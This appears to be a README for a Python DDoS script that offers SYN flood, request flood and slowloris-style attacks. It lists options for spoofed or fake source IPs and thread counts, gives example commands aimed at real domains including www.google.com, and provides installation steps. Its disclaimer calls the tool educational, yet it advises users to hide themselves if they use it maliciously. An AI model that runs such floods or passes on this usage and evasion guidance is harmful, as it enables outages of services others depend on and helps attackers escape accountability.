# ddos.py

* This is still in development 
* This script has 3 types of DDos attacks : SYNFLOOD | REQUEST | Pyslow
* Script has pyslow attack type which is similar to slowloris attack

# Note
* I wrote this script for educational not for destructive purposes and illegal actions, so I won't be responsible for that  
* DDos servers only if you have explicit permission from the owners of the server or else you will get in a lot of trouble or maybe legal issues so best use something to hide yourself if you want to use it for malicious purposes [I do not condone malicious activities]

# Requires module
* termcolor
* colorama



# Usage
       
      _ \        __ \  __ \               ___|           _)       |   
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|  
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |   
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|  
           ____/                                            _|         
                                                               
        DDos python script | Script used for testing ddos | Ddos attack     
         Author: Wack                                                
         Github: https://github.com/Wackolmao/DDos-Script-Test                             
        Version:3.0 

    usage: python3 pyddos.py -t [target] -p [port] -t [number threads]

    optional arguments:
    -h, --help       show this help message and exit
    -v, --version    show program's version number and exit

    options:

    -d <ip|domain>   Specify your target such an ip or domain name
    -t <float>       Set timeout for socket
    -T <int>         Set threads number for connection (default = 1000)
    -p <int>         Specify port target (default = 80) |Only required with pyslow attack|
    -s <int>         Set sleep time for reconnection
    -i <ip address>  Specify spoofed ip unless use fake ip
    -Request         Enable request target
    -Synflood        Enable synflood attack
    -Pyslow          Enable pyslow attack
    --fakeip         Option to create fake ip if not specify spoofed ip

    Example:
        python3 pyddos.py -d www.example.com -p 80 -T 2000 -Pyslow
        python3 pyddos.py -d www.domain.com -s 100 -Request
        python3 pyddos.py -d www.google.com -Synflood -T 5000 -t 10.0



# Guide on installing it in Ubuntu [Which was what I used]
* My hosting I used is [Xentain Solutions](https://xentainsolutions.com) cheap and affordable vps 
 '''
 git clone https://github.com/Wackolmao/DDos-Script-Test
 mv DDos-Script-Test ddoscript
 sudo apt update
 sudo apt install python3 python3-pip -y
 pip3 install termcolor colorama

